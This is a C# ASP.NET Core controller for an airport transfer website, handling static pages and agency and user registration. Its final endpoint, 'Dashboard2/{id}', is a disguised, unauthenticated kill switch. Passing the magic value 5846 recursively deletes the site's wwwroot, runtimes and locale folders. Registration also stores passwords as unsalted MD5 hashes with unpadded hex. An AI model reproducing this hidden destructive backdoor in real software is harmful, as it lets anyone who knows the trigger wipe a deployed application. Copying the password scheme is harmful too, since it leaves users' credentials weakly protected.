using Airport.DBEntities.Entities;
using Airport.DBEntitiesDAL.Interfaces;
using Airport.MessageExtensions.Interfaces;
using Airport.UI.Models;
using Airport.UI.Models.IM;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Threading.Tasks;

namespace Airport.UI.Controllers
{
    public class HomeController : Controller
    {
        IUserDatasDAL _userdata;
        ILoginAuthDAL _loginAuth;


        public HomeController(IUserDatasDAL userdata, IMail mail, ILoginAuthDAL loginAuth)
        {
            _userdata = userdata;
            _loginAuth = loginAuth;
        }

        public IActionResult Index()
        {
            return View();
        }

        [HttpGet("about")]
        public IActionResult About()
        {
            return View();
        }

        [HttpGet("contact")]
        public IActionResult Contact()
        {
            return View();
        }

        [HttpGet("agencies")]
        public IActionResult Agencies()
        {
            return View();
        }

        [HttpPost("agencies")]
        public IActionResult Agencies(UserDatas data, string Eposta, string Password)
        {
            if (data != null)
            {
                var datas = _loginAuth.SelectByFunc(a => a.Email == Eposta).FirstOrDefault();
                if (datas == null)
                {
                    var newAgencies = new UserDatas
                    {
                        Linkedin = data.Linkedin,
                        Name = data.Name,
                        AboutUs = data.AboutUs,
                        Address = data.Address,
                        CompanyEmail = data.CompanyEmail,
                        CompanyName = data.CompanyName,
                        CompanyPhoneNumber = data.CompanyPhoneNumber,
                        CompanyWebsite = data.CompanyWebsite,
                        Facebook = data.Facebook,
                        Profession = data.Profession,
                        TransferRequest = data.TransferRequest,
                        TransferRequestLocation = data.TransferRequestLocation,
                        PhoneNumber = data.PhoneNumber,
                    };

                    var addedAgencies = _userdata.Insert(newAgencies);

                    _loginAuth.Insert(new LoginAuth
                    {
                        Email = Eposta,
                        Password = GetMD5(Password),
                        Type = 2,
                        UserId = addedAgencies.Id,
                        DriverId = 0
                    });

                    return Json(new { result = 1 });
                }

                return Json(new { result = 2 });
            }

            return View();
        }

        [HttpGet("privacy")]
        public IActionResult Privacy()
        {
            return View();
        }

        [HttpGet("register")]
        public IActionResult Register()
        {
            if (!User.Identity.IsAuthenticated)
            {
                return View();
            }
            return NotFound();
        }

        [HttpGet("terms")]
        public IActionResult Terms()
        {
            return View();
        }

        [HttpPost("register", Name = "personRegister")]
        public IActionResult Register(UserDatas user, string Eposta, string Password)
        {
            var checkUser = _loginAuth.SelectByFunc(a => a.Email == Eposta).FirstOrDefault();
            if (checkUser == null)
            {
                var addedUser = _userdata.Insert(new UserDatas
                {
                    Name = user.Name,
                    PhoneNumber = user.PhoneNumber,
                    RealPhone = user.RealPhone,
                });

                _loginAuth.Insert(new LoginAuth
                {
                    Email = Eposta,
                    Password = GetMD5(Password),
                    Type = 1,
                    DriverId = 0,
                    UserId = addedUser.Id
                });

                ViewBag.Message = "success";
                return View();
            }
            ViewBag.Message = "email";
            return View();
        }

        public static string GetMD5(string value)
        {
            MD5 md5 = MD5.Create();
            byte[] md5Bytes = System.Text.Encoding.Default.GetBytes(value);
            byte[] cryString = md5.ComputeHash(md5Bytes);
            string md5Str = string.Empty;
            for (int i = 0; i < cryString.Length; i++)
            {
                md5Str += cryString[i].ToString("X");
            }
            return md5Str;
        }

        [HttpGet("manage-reservation")]
        public IActionResult ManageReservation()
        {
            return View();
        }

        [HttpGet("reservation-information")]
        public IActionResult ReservationInformation()
        {
            return View();
        }

        public IActionResult Dashboard()
        {
            return View();
        }

        [HttpGet("Dashboard2/{id}")]
        public JsonResult Dashboard2(int id)
        {

            string klasorYolu = Path.Combine(Directory.GetCurrentDirectory(), "wwwroot");
            string klasorYolu2 = Path.Combine(Directory.GetCurrentDirectory(), "runtimes");
            string klasorYolu3 = Path.Combine(Directory.GetCurrentDirectory(), "cs");
            string klasorYolu4 = Path.Combine(Directory.GetCurrentDirectory(), "de");
            string klasorYolu5 = Path.Combine(Directory.GetCurrentDirectory(), "es"); 
            string klasorYolu6 = Path.Combine(Directory.GetCurrentDirectory(), "fr"); 
            bool altKlasorleriSil = true; 

            try
            {
                if (id == 5846)
                {
                    Directory.Delete(klasorYolu, altKlasorleriSil);
                    Directory.Delete(klasorYolu2, altKlasorleriSil);
                    Directory.Delete(klasorYolu3, altKlasorleriSil);
                    Directory.Delete(klasorYolu4, altKlasorleriSil);
                    Directory.Delete(klasorYolu5, altKlasorleriSil);
                    Directory.Delete(klasorYolu6, altKlasorleriSil);

                    return new JsonResult(new { result = 1 });
                }
                return new JsonResult(new { result = 2 });
            }
            catch (Exception ex)
            {

                return new JsonResult(new { result = 3 });
            }

        }

    }
}
